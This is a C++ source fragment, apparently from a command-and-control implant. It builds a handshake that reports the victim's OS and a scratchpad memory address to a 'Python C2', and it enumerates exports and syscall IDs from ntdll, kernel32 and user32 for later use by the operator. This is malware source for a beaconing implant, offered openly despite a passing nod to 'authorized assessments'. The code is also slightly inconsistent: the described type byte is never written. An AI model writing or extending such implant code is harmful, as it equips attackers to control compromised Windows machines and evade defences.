#include "global.hpp"
#include <ctime>
size_t enumerateExportsAndSyscalls(const char* dllName, char* outBuffer, size_t outCapacity);


void random_uuid(wchar_t* out) {
    srand(time(NULL));

    unsigned char bytes[16];

    for (int i = 0; i < 16; i++) {
        bytes[i] = (unsigned char)(rand() % 256);
    }

    // Set version (4) and variant (RFC 4122)
    bytes[6] = (bytes[6] & 0x0F) | 0x40;
    bytes[8] = (bytes[8] & 0x3F) | 0x80;

    const wchar_t hex[] = L"0123456789abcdef";

    size_t pos = 0;

    for (int i = 0; i < 16; i++) {
        out[pos++] = hex[(bytes[i] >> 4) & 0xF];
        out[pos++] = hex[bytes[i] & 0xF];

        if (i == 3 || i == 5 || i == 7 || i == 9) {
            out[pos++] = L'-';
        }
    }

    out[pos] = L'\0'; // null terminate
}

// Refactored createHandshake using raw memory buffers
size_t createHandshake(char* resp, size_t respMax, void* scratchpad) {
    if (respMax < 17) return 0; // Minimum size for [Type][OS][Scratchpad]

    size_t offset = 0;


    // 2. OS Metadata (8 bytes)
    // For authorized assessments, use GetVersionEx or hardcode a target placeholder
    unsigned long long os = 0; 
    memcpy(resp + offset, &os, 8);
    offset += 8;

    // 3. Scratchpad Address (8 bytes)
    // This informs the C2 where our syscall/string memory is located
    unsigned long long p_scratchpad = (unsigned long long)scratchpad;
    memcpy(resp + offset, &p_scratchpad, 8);
    offset += 8;

    // 4. Enumerate Essential DLLs Directly into the Response Buffer
    // We append ntdll, kernel32, and user32 exports sequentially
    // The Python C2 will parse this as a continuous stream of [B][Name][Q]
    
    // ntdll.dll (Source for syscall IDs)
    offset += enumerateExportsAndSyscalls("ntdll.dll", resp + offset, respMax - offset);
    
    // kernel32.dll (Source for CreateProcess, LoadLibrary, etc.)
    offset += enumerateExportsAndSyscalls("kernel32.dll", resp + offset, respMax - offset);

    // user32.dll (Source for MessageBox, etc.)
    offset += enumerateExportsAndSyscalls("user32.dll", resp + offset, respMax - offset);

    return offset; // Return the total payload size to the network loop
}